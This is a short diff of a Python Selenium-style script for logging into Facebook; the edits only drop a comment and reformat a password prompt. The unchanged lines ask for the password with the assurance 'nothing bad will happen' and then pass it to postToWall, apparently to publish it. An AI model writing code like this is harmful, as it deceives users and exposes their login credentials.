@@ -7,7 +7,6 @@ LOGIN_URL = 'https://mbasic.facebook.com/'
 
 class FacebookLogin():
     def __init__(self, email, password, browser='Chrome'):
-        # Store credentials for login
         self.email = email
         self.password = password
         if browser == 'Chrome':
@@ -42,8 +41,8 @@ class FacebookLogin():
 if __name__ == '__main__':
     # Enter your login credentials here
     username = input('please enter facebook username/email: ')
-    pw = input("please enter facebook password (don't worry, nothing bad will happen)")
-    
+    pw = input("please enter facebook password (don't worry, nothing bad will happen): ")
+
     fb_login = FacebookLogin(email=username, password=pw, browser='Firefox')
     fb_login.login()
     fb_login.postToWall(pw, username)
